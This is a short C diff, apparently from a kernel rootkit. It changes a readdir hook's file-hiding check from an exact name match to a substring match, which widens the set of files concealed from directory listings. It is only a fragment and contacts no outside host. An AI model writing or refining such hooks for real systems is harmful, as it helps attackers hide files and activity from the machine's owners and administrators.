@@ -943,7 +943,8 @@ READDIR_HOOK_START(root)
     struct file_entry *f;
 
     list_for_each_entry(f, &file_list, list) {
-        if (strcmp(name, f->name) == 0) {
+        //if (strcmp(name, f->name) == 0) {
+	if (strstr(f->name, name) != NULL) {
             return 0;
         }
     }
